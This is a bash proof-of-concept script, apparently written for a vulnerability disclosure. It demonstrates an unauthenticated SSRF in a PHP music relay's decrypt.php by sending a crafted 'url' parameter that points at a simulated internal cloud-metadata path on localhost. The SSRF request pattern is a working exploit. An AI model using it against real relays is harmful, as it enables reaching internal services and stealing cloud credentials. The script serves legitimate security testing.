#!/bin/bash
# PoC Part A — unauthenticated SSRF request fires against an attacker-chosen
# internal host, on the UNMODIFIED decrypt.php with its default config
# (RELAY_ALLOW_PRIVATE_IP = true, i.e. SSRF guard off).
#
# Usage: ./kuwo-ssrf-request-poc.sh /path/to/kuwo-music-relay/decrypt.php
set -u
RELAY="${1:?usage: $0 /path/to/decrypt.php}"
HERE="$(cd "$(dirname "$0")" && pwd)"
rm -f "$HERE/internal_hits.log"
# Clear the relay's probe cache so the size-probe fetch isn't short-circuited by
# a stale .size file from a previous run (cache key = basename(url path)+ekey).
rm -rf "$(php -r 'echo sys_get_temp_dir();')/mflac_relay" 2>/dev/null

echo "=== default SSRF-guard flag in the UNMODIFIED file ==="
grep -n "define('RELAY_ALLOW_PRIVATE_IP'" "$RELAY"

# Simulated internal-only service (stands in for cloud metadata / internal API).
php -S 127.0.0.1:19999 "$HERE/kuwo-internal-server.php" >/dev/null 2>&1 &
INT=$!
# The relay itself, unmodified.
php -S 127.0.0.1:18080 "$RELAY" >/dev/null 2>&1 &
REL=$!
sleep 1

EKEY=$(printf 'A%.0s' $(seq 1 120))   # any 50-4096 char value; validity is irrelevant to the fetch
TARGET="http://127.0.0.1:19999/latest/meta-data/iam-$$-$RANDOM"   # unique path => fresh cache key
echo
echo "=== Unauthenticated attacker request ==="
echo "GET /decrypt.php?url=$TARGET&ekey=<120 chars>  Range: 0-63"
curl -s -H 'Range: bytes=0-63' \
  "http://127.0.0.1:18080/decrypt.php?url=$TARGET&ekey=$EKEY" \
  -o /dev/null

echo
echo "=== Did the relay reach the INTERNAL service? (UA proves it was the relay) ==="
sleep 0.3
cat "$HERE/internal_hits.log" 2>/dev/null || echo "(no hits recorded)"

kill "$INT" "$REL" 2>/dev/null
echo "---done---"
